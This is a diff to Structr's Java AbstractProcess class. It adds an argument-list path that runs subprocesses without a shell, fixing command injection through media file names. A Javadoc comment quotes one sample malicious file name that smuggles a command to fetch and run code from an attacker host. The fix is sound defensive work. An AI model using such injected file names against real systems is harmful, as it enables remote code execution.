@@ -23,6 +23,7 @@ import org.slf4j.LoggerFactory;
 import org.structr.api.config.Settings;
 import org.structr.common.SecurityContext;
 
+import java.util.List;
 import java.io.IOException;
 import java.util.concurrent.Callable;
 import java.util.concurrent.atomic.AtomicBoolean;
@@ -52,14 +53,50 @@ public abstract class AbstractProcess<T> implements Callable<T> {
 	public abstract T processExited(final int exitCode);
 	public abstract void preprocess();
 
+	/**
+	 * What to write to the log for this process. Falls back to the argument list where a subclass
+	 * provides one, because getCommandLine() is null for those and this is called on every run and again
+	 * on a non-zero exit code.
+	 */
 	public StringBuilder getLogLine() {
 
-		return getCommandLine();
+		final StringBuilder commandLine = getCommandLine();
+		if (commandLine != null) {
+
+			return commandLine;
+		}
+
+		final List<String> arguments = getCommandArguments();
+		if (arguments != null) {
+
+			return new StringBuilder(String.join(" ", arguments));
+		}
+
+		return new StringBuilder();
 	}
 
 	private boolean shouldLogCommandWhenExecuting() {
 
 		return (getLogBehaviour() != Settings.SCRIPT_PROCESS_LOG_STYLE.NOTHING);
+	}
+
+	/**
+	 * The command as a list of arguments, executed without a shell, or null to fall back to
+	 * {@link #getCommandLine()}.
+	 *
+	 * <p>Ticket 1587: getCommandLine() is handed to /bin/sh -c, so every character of it is shell
+	 * syntax. Where any part of the command comes from data - and for the media processes that part is a
+	 * file path, which in a mounted folder carries the file NAME - a name like
+	 * "x;curl attacker|sh;.mp4" is a command, not an argument. Quoting at each call site is the kind of
+	 * defence that holds until someone adds the next command; not having a shell is the kind that does
+	 * not need maintaining.
+	 *
+	 * <p>Deliberately an opt-in second path rather than a replacement: exec() and exec_binary() run a
+	 * command line an administrator configured, and pipes and redirections are the point there.
+	 */
+	public List<String> getCommandArguments() {
+
+		return null;
 	}
 
 	@Override
@@ -69,10 +106,14 @@ public abstract class AbstractProcess<T> implements Callable<T> {
 
 			preprocess();
 
-			final StringBuilder commandLine = getCommandLine();
-			if (commandLine != null) {
+			final List<String> arguments    = getCommandArguments();
+			final StringBuilder commandLine = arguments == null ? getCommandLine() : null;
 
-				String[] args = {"/bin/sh", "-c", commandLine.toString() };
+			if (arguments != null || commandLine != null) {
+
+				final String[] args = arguments != null
+					? arguments.toArray(new String[0])
+					: new String[] { "/bin/sh", "-c", commandLine.toString() };
 
 				if (shouldLogCommandWhenExecuting()) {
 
